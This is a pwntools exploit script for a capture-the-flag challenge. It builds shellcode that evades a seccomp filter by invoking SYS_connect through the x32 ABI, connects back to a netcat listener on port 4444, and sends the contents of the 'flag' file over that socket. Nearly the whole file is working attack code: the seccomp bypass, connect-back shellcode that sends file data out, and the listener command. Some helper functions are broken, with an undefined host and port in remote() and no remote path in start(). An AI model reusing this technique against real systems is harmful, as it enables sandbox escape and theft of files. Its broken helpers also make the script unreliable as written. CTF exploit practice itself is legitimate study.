#!/usr/bin/env python
# -*- coding: utf-8 -*-

# https://ctftime.org/writeup/18236
# nc -vvv -l -p 4444
# python exp.py LOCAL
# wsl doesn't work because of not supporting x32 ABI

from pwn import *

exe = context.binary = ELF('./chall')

def local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return local(argv, *a, **kw)


print args

p = start()
host, port = '127.0.0.1', 4444
# We replace SYS_connect to use x32 ABI syscalls --- which the used seccomp policy doesn't block
connect = shellcraft.amd64.connect(host, port).replace('SYS_connect', 'SYS_connect|0x40000000')
# Note: connect from pwntools leave the sockfd in 'rbp' so we use it below
catflag = shellcraft.amd64.cat(filename='flag', fd='rbp')

payload = asm(connect + catflag, arch='amd64')
write('payload', payload)

p.sendline(payload)

p.interactive()